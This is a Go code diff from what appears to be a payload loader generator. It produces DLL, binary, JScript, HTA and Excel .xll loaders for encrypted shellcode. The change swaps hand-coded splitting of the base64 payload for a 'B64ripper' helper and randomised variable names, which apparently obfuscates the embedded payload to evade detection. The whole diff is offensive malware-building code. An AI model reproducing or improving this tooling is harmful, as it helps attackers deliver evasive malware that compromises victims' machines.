@@ -143,7 +143,8 @@ func DLLfile(b64ciphertext string, b64key string, b64iv string, mode string, ref
 	WindowsVersion := &WindowsVersion{}
 	WindowsVersion.Variables = make(map[string]string)
 
-	DLL.Variables["ciphertext"] = b64ciphertext
+	DLL.Variables["fullciphertext"] = Cryptor.VarNumberLength(4, 12)
+	DLL.Variables["ciphertext"] = Utils.B64ripper(b64ciphertext, DLL.Variables["fullciphertext"], true)
 	DLL.Variables["key"] = b64key
 	DLL.Variables["iv"] = b64iv
 	DLL.Variables["vkey"] = Cryptor.VarNumberLength(4, 12)
@@ -404,17 +405,8 @@ func Binaryfile(b64ciphertext string, b64key string, b64iv string, mode string, 
 	Binary.Variables = make(map[string]string)
 	WindowsVersion := &WindowsVersion{}
 	WindowsVersion.Variables = make(map[string]string)
-	splitval := len(b64ciphertext)
-	splitval = splitval - 45
-	encodedfirsthalf := string(b64ciphertext[:splitval])
-	encodedsecondhalf := string(b64ciphertext[splitval:])
-
-	Binary.Variables["ciphertext"] = b64ciphertext
 	Binary.Variables["fullciphertext"] = Cryptor.VarNumberLength(4, 12)
-	Binary.Variables["b64_string1name"] = Cryptor.VarNumberLength(4, 12)
-	Binary.Variables["b64_string2name"] = Cryptor.VarNumberLength(4, 12)
-	Binary.Variables["b64_string1value"] = encodedfirsthalf
-	Binary.Variables["b64_string2value"] = encodedsecondhalf
+	Binary.Variables["ciphertext"] = Utils.B64ripper(b64ciphertext, Binary.Variables["fullciphertext"], true)
 	Binary.Variables["key"] = b64key
 	Binary.Variables["iv"] = b64iv
 	Binary.Variables["vkey"] = Cryptor.VarNumberLength(4, 12)
@@ -782,18 +774,10 @@ func JScript_Buff(fso string, dropPath string, encoded string, code string, name
 	SandboxJScript := &SandboxJScript{}
 	JScript.Variables = make(map[string]string)
 	SandboxJScript.Variables = make(map[string]string)
-
-	rawstring := []rune(encoded)
-	splitval := len(rawstring)
-	splitval = splitval - 45
-	encodedfirsthalf := string(rawstring[:splitval])
-	encodedsecondhalf := string(rawstring[splitval:])
-
 	JScript.Variables["DLLName"] = Cryptor.VarNumberLength(4, 12)
 	JScript.Variables["fso"] = fso
 	JScript.Variables["dropPath"] = dropPath
 	JScript.Variables["Base64"] = Cryptor.VarNumberLength(4, 12)
-	JScript.Variables["dll"] = Cryptor.VarNumberLength(4, 12)
 	JScript.Variables["base6411"] = Cryptor.VarNumberLength(4, 12)
 	JScript.Variables["rtest"] = Cryptor.VarNumberLength(4, 12)
 	JScript.Variables["atest"] = Cryptor.VarNumberLength(4, 12)
@@ -810,11 +794,8 @@ func JScript_Buff(fso string, dropPath string, encoded string, code string, name
 	JScript.Variables["BinaryStream"] = Cryptor.VarNumberLength(4, 12)
 	JScript.Variables["binaryWriter"] = Cryptor.VarNumberLength(4, 12)
 	JScript.Variables["dllname"] = ""
-	JScript.Variables["dll_string1name"] = Cryptor.VarNumberLength(4, 12)
-	JScript.Variables["dll_string2name"] = Cryptor.VarNumberLength(4, 12)
-	JScript.Variables["dll_string1"] = encodedfirsthalf
-	JScript.Variables["dll_string2"] = encodedsecondhalf
-	JScript.Variables["dll_code"] = encoded
+	JScript.Variables["dllvar"] = Cryptor.VarNumberLength(4, 12)
+	JScript.Variables["dll"] = Utils.B64ripper(encoded, JScript.Variables["dllvar"], false)
 	JScript.Variables["Loader"] = code
 	if mode == "excel" {
 		JScript.Variables["dllext"] = ".xll"
@@ -999,7 +980,6 @@ func CompileLoader(mode string, outFile string, filename string, name string, Co
 	finalcode := JScript_Buff(fso, dropPath, encoded, code, name, mode, sandbox)
 	URL = Utils.Command(URL, CommandLoader, outFile)
 	if CommandLoader == "hta" {
-		//finalcode = HTA_Buff(finalcode)
 		hexcode := hex.EncodeToString(content)
 		finalcode = HTA_Buff(hexcode, filename)
 
